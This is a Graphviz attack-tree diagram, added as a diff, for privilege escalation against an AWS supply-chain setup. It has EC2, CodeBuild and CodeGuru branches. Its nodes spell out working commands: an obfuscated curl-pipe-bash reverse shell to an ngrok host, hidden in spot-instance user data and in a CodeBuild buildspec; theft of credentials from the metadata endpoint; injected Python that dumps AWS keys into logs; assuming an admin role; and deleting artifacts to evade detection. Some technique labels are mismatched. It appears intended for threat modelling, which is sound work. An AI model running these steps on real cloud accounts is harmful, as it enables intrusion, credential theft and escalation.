@@ -1,0 +1,455 @@
+
+digraph AttackGraph {
+    // Global graph attributes
+    graph [fontname="Arial", splines=ortho, nodesep=0.5, ranksep=0.75, rankdir=TB, ordering="out"];
+    node [fontname="Arial"];
+    
+    // Final goal node (common exit point)
+    "Tree_Root" [label="Cloud-based supply chain System",
+        shape=rectangle,
+        style=filled,
+        fillcolor="#0683FF",
+        fontcolor="white",
+        fontname="Arial"
+    ];
+    
+    "Tree_Root" -> "EC2_Root";
+    "Tree_Root" -> "CB_Root";
+    "Tree_Root" -> "CD_Root";
+    
+    { rank = same; "EC2_Root"; "CB_Root"; "CD_Root"; }
+    "EC2_Root" -> "CB_Root" [style=invis, weight=100];
+    "CB_Root" -> "CD_Root" [style=invis, weight=100];
+    
+    "dummy_left" [style=invis, width=0.1, height=0.1, label=""];
+    "dummy_right" [style=invis, width=0.1, height=0.1, label=""];
+    { rank = same; "dummy_left"; "FinalGoal"; "dummy_right"; }    
+
+    { rank = same; "EC2_1"; "CB_Step1"; }
+
+    // Combined Legend (shared by both branches)
+    subgraph cluster_legend {
+        label="Legend";
+        style=dotted;
+        node [shape=rectangle, style=filled];
+        attack_legend [label="Attack Node", fillcolor="#ACCFF2", fontcolor="black"];
+        // control_legend [label="Security Control", fillcolor="#0683FF", fontcolor="white"];
+    }
+    
+    // Final goal node (common exit point)
+    "FinalGoal" [label="Privilege Escalation Attack",
+        shape=rectangle,
+        style=filled,
+        fillcolor="#0683FF",
+        fontcolor="white",
+        fontname="Arial"
+    ];
+    
+    // ----- EC2 ATtack Tree Branch -----
+    subgraph cluster_EC2 {
+        label="EC2 Attack Branch";
+        style=rounded;
+        
+        // Root Node (Security Control)
+        "EC2_Root" [
+            label="AWS EC2 (monitored by Amazon GuardDuty)",
+            shape=rectangle,
+            style=filled,
+            fillcolor="#0683FF",
+            fontcolor="white",
+            fontname="Arial"
+        ];
+    
+        // Attack Node 1
+        "EC2_1" [
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            label=<
+                <b>1. Obtain ec2:RequestSpotInstances + iam:PassRole Permissions</b><br/>
+                <font color="#ff0000">TTP: T1078 (Valid Accounts)</font>
+            >,
+            margin=0.2
+        ];
+    
+        // Attack Node 2
+        "EC2_2" [
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            label=<
+                <b>2. Craft Reverse Shell Payload (Obfuscated)</b><br/>
+                <u>Command</u>:<br/>
+                REV=$(printf '#!/bin/bash\ncurl https://reverse-shell.sh/2.tcp.ngrok.io:14510 \| bash' \| base64 -w0)<br/>
+                <u>Input</u>: Ngrok C2 endpoint (2.tcp.ngrok.io:14510)<br/>
+                <u>Result</u>: Base64-encoded reverse shell script<br/>
+                <font color="#ff0000">TTP: T1059 (Command and Scripting Interpreter)</font>
+            >,
+            margin=0.2
+        ];
+    
+        // Attack Node 3
+        "EC2_3" [
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            label=<
+                <b>3. Request Spot Instance with Malicious User Data</b><br/>
+                <u>Command</u>:<br/>
+                aws ec2 request-spot-instances --instance-count 1 \<br/>
+                --launch-specification '{"IamInstanceProfile":{"Name":"EC2-CloudWatch-Agent-Role"},<br/>
+                "InstanceType":"t2.micro","UserData":"'"$REV"'","ImageId":"ami-0c1bc246476a5572b"}'<br/>
+                <u>Input</u>: Stolen IAM role name (EC2-CloudWatch-Agent-Role)<br/>
+                <u>Result</u>: Spot Instance launched with backdoored user data<br/>
+                <font color="#ff0000">TTP: T1552 (Unsecured Credentials)</font>
+            >,
+            margin=0.2
+        ];
+    
+        // Attack Node 4
+        "EC2_4" [
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            label=<
+                <b>4. Execute Reverse Shell &amp; Retrieve IAM Role Creds</b><br/>
+                <u>Command</u>:<br/>
+                curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<br/>
+                <u>Input</u>: Instance metadata endpoint<br/>
+                <u>Result</u>: Temporary credentials for EC2-CloudWatch-Agent-Role obtained<br/>
+                <font color="#ff0000">TTP: T1003 (OS Credential Dumping)</font>
+            >,
+            margin=0.2
+        ];
+    
+        // Define edges for the EC2 branch
+        "EC2_Root" -> "EC2_1";
+        "EC2_1" -> "EC2_2";
+        "EC2_2" -> "EC2_3";
+        "EC2_3" -> "EC2_4";
+        "EC2_4" -> "FinalGoal";
+    }
+    
+    // ----- CodeBuild Attack Branch -----
+    subgraph cluster_CodeBuild {
+        label="CodeBuild Attack Branch";
+        style=rounded;
+        
+        // Root Node (Security Control)
+        "CB_Root" [
+            label="AWS CodeBuild (Protected by GuardDuty)",
+            shape=rectangle,
+            style=filled,
+            fillcolor="#0683FF",
+            fontcolor="white",
+            fontname="Arial"
+        ];
+    
+        // Step 1
+        "CB_Step1" [
+            label=<
+                <b>Step 1: Craft Exploit Payload</b><br/>
+                <u>Command</u>: REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | bash"<br/>
+                <u>Input</u>: Reverse shell URL (attacker-controlled)<br/>
+                <u>Result</u>: Malicious command stored in $REV variable<br/>
+                <font color="#ff0000">TTP: T1059 (Command and Scripting Interpreter)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        // Step 2
+        "CB_Step2" [
+            label=<
+                <b>Step 2: Create JSON Payload</b><br/>
+                <u>Command</u>: JSON="{<br/>
+                    \"name\": \"codebuild-demo-project\",<br/>
+                    \"source\": {<br/>
+                        \"type\": \"NO_SOURCE\",<br/>
+                        \"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"},<br/>
+                    \"artifacts\": {<br/>
+                        \"type\": \"NO_ARTIFACTS\"},<br/>
+                    \"environment\": {<br/>
+                        \"type\": \"LINUX_CONTAINER\",<br/>
+                        \"image\": \"aws/codebuild/standard:1.0\",<br/>
+                        \"computeType\": \"BUILD_GENERAL1_SMALL\"},<br/>
+                    \"serviceRole\": \"arn:aws:iam::947247140022:role/codebuild-CI-Build-service-role-2\"}" <br/>
+                <u>Input</u>: None<br/>
+                <u>Result</u>: Malicious rev.json file with embedded reverse shell<br/>
+                <font color="#ff0000">TTP: T1530 (Data Manipulation)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        // Step 3
+        "CB_Step3" [
+            label=<
+                <b>Step 3: Create Malicious CodeBuild Project</b><br/>
+                <u>Command</u>: aws codebuild create-project --cli-input-json file://rev.json<br/>
+                <u>Input</u>: rev.json with malicious buildspec<br/>
+                <u>Result</u>: CodeBuild project created with IAM role permissions<br/>
+                <font color="#ff0000">TTP: T1078 (Valid Accounts)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        // Step 4
+        "CB_Step4" [
+            label=<
+                <b>Step 4: Start Malicious Build</b><br/>
+                <u>Command</u>: aws codebuild start-build --project-name codebuild-demo-project<br/>
+                <u>Input</u>: None<br/>
+                <u>Result</u>: Build container executes reverse shell<br/>
+                <font color="#ff0000">TTP: T1553 (Subvert Trust Controls)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        // Step 5
+        "CB_Step5" [
+            label=<
+                <b>Step 5: Steal IAM Role Credentials</b><br/>
+                <u>Command</u>: curl http://169.254.170.2/latest/meta-data/iam/security-credentials/&lt;role-name&gt;<br/>
+                <u>Input</u>: Role name from compromised project<br/>
+                <u>Result</u>: Attacker gains temporary AWS credentials<br/>
+                <font color="#ff0000">TTP: T1003 (OS Credential Dumping)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+
+    
+        // Step 6 (Cleanup Artifacts)
+        "CB_Step6" [
+            label=<
+                <b>Step 6: Cleanup Artifacts</b><br/>
+                <u>Command</u>: aws codebuild delete-project --name codebuild-demo-project<br/>
+                <u>Input</u>: None<br/>
+                <u>Result</u>: Malicious project deleted to evade detection<br/>
+                <font color="#ff0000">TTP: T1070 (Indicator Removal)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        // Define edges for the CodeBuild branch
+        "CB_Root" -> "CB_Step1";
+        "CB_Step1" -> "CB_Step2";
+        "CB_Step2" -> "CB_Step3";
+        "CB_Step3" -> "CB_Step4";
+        "CB_Step4" -> "CB_Step5";
+        "CB_Step5" -> "CB_Step6";
+        "CB_Step6" -> "FinalGoal";
+    }
+    
+    subgraph cluster_CodeGuru {
+        label="CodeBuild Attack Branch";
+        style=rounded;
+
+        // Root Node (Security Control)
+        "CD_Root" [
+            label="AWS CodeGuru (Protecting CodePipeline)",
+            shape=rectangle,
+            style=filled,
+            fillcolor="#0683FF",
+            fontcolor="white",
+            fontname="Arial"
+        ];
+    
+        // Attack Nodes
+        "CD_Step1" [
+            label=<
+                <b>Step 1: Inject Malicious Code</b><br/>
+                <u>Command</u>: git clone https://github.com/company/project-supply-chain.git &amp;&amp; cd project-supply-chain &amp;&amp; git checkout -b exploit-codeguru<br/>
+                <u>Input</u>: Target repository URL<br/>
+                <u>Result</u>: Cloned repo and created exploit branch<br/>
+                <font color="#ff0000">TTP: T1078 (Valid Accounts)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        "CD_Step2" [
+            label=<
+                <b>Step 2: Modify config.py</b><br/>
+                <u>Command</u>: import boto3 <br/>
+                    def exfiltrate():<br/>
+                     session = boto3.Session()<br/>
+                     creds = session.get_credentials().get_frozen_credentials()<br/>
+                     print(f"AWS_ACCESS_KEY_ID={creds.access_key}")<br/>
+                     print(f"AWS_SECRET_ACCESS_KEY={creds.secret_key}")<br/>
+                     print(f"AWS_SESSION_TOKEN={creds.token}")<br/>
+                    exfiltrate()<br/>
+                <u>Input</u>: None<br/>
+                <u>Result</u>: Code added to expose credentials in CodeGuru logs<br/>
+                <font color="#ff0000">TTP: T1003 (OS Credential Dumping)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        "CD_Step3" [
+            label=<
+                <b>Step 3: Push Changes</b><br/>
+                <u>Command</u>: git add config.py &amp;&amp; git commit -m "Security test in CodeGuru" &amp;&amp; git push origin exploit-codeguru<br/>
+                <u>Input</u>: GitHub credentials<br/>
+                <u>Result</u>: Malicious code pushed to remote repository<br/>
+                <font color="#ff0000">TTP: T1530 (Data Manipulation)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        "CD_Step4" [
+            label=<
+                <b>Step 4: Trigger CodeGuru Analysis</b><br/>
+                <u>Command</u>: while true; do <br/>
+                     STATUS=$(aws codeguru-reviewer list-code-reviews --type RepositoryAnalysis --region us-east-1 --query "CodeReviewSummaries[0].State" --output text) <br/>
+                     echo "Current CodeGuru status: $STATUS" <br/>
+                     if [[ "$STATUS" == "Completed" ]]; then <br/>
+                     break <br/>
+                     fi <br/>
+                     sleep 30 <br/>
+                    done<br/>
+                <u>Input</u>: AWS CLI configured<br/>
+                <u>Result</u>: CodeGuru completes analysis and logs credentials<br/>
+                <font color="#ff0000">TTP: T1553 (Subvert Trust Controls)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        "CD_Step5" [
+            label=<
+                <b>Step 5: Get Review ARN</b><br/>
+                <u>Command</u>: REVIEW_ARN=$(aws codeguru-reviewer list-code-reviews --type <br/> 
+                RepositoryAnalysis --region us-east-1 --query "CodeReviewSummaries[0].CodeReviewArn" --output text)<br/>
+                <u>Input</u>: None<br/>
+                <u>Result</u>: ARN of CodeGuru review stored in $REVIEW_ARN<br/>
+                <font color="#ff0000">TTP: T1530 (Data Manipulation)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        "CD_Step6" [
+            label=<
+                <b>Step 6: Extract Credentials</b><br/>
+                <u>Command</u>: aws codeguru-reviewer list-recommendations --code-review-arn $REVIEW_ARN \ --region us-east-1 <br/>
+                | jq '.RecommendationSummaries[].RecommendationText' <br/> 
+                | grep -E "AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN"<br/>
+                <u>Input</u>: $REVIEW_ARN<br/>
+                <u>Result</u>: Credentials exposed in CodeGuru logs<br/>
+                <font color="#ff0000">TTP: T1003 (OS Credential Dumping)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        "CD_Step7" [
+            label=<
+                <b>Step 7: Assume Admin Role</b><br/>
+                <u>Command</u>: aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/AdminRole" --role-session-name "Attacksession<br/>
+                <u>Input</u>: Extracted credentials<br/>
+                <u>Result</u>: Attacker gains temporary admin permissions<br/>
+                <font color="#ff0000">TTP: T1078 (Valid Accounts)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+    
+        "CD_Step8" [
+            label=<
+                <b>Step 8: Verify Elevated Permissions</b><br/>
+                <u>Commands</u>:<br/>
+                1. aws sts get-caller-identity<br/>
+                2. aws iam list-policies --scope All<br/>
+                3. aws s3 ls s3://supply-chain-data/<br/>
+                <u>Input</u>: Admin credentials<br/>
+                <u>Result</u>: Confirms admin access and lists sensitive data<br/>
+                <font color="#ff0000">TTP: T1068 (Exploitation for Privilege Escalation)</font>
+            >,
+            shape=rectangle,
+            style=filled,
+            fillcolor="#ACCFF2",
+            fontcolor="black",
+            fontname="Arial",
+            margin=0.2
+        ];
+
+        // Edges
+        "CD_Root" -> "CD_Step1";
+        "CD_Step1" -> "CD_Step2";
+        "CD_Step2" -> "CD_Step3";
+        "CD_Step3" -> "CD_Step4";
+        "CD_Step4" -> "CD_Step5";
+        "CD_Step5" -> "CD_Step6";
+        "CD_Step6" -> "CD_Step7";
+        "CD_Step7" -> "CD_Step8";
+        "CD_Step8" -> "FinalGoal";
+    }
+}
+
